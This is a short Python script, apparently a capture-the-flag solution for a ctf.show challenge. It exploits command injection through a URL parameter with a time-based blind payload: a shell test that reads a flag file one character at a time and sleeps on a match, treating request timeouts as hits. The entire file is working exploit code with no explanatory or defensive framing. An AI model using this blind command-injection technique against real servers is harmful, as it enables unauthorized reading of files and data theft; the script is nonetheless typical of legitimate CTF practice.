import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
	if key==1:
		break
	for n in str:
		payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 1;fi".format(j,n)
		#print(payload)
		url="http://137122c7-7cba-4bc3-ac4c-c654048e474d.challenge.ctf.show:8080/?c="+payload
		try:
			requests.get(url,timeout=(0.5,0.5))
		except:
		    result=result+n
		    print(result)
		    break

